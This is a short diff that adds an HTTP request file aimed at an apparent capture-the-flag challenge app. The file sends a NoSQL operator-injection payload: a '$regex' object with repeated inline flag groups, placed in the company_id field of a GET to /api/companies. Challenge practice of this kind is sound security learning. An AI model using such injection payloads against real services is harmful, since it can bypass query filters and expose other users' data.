@@ -1,0 +1,8 @@
+@url = https://chal41-dbyhu47.vercel.app
+
+GET {{url}}/api/companies HTTP/1.1
+Content-Type: application/json
+
+{
+  "company_id": { "$regex": "(?i)(?-i)(?-i)(?-i)(?-i)(?-i)" }
+}
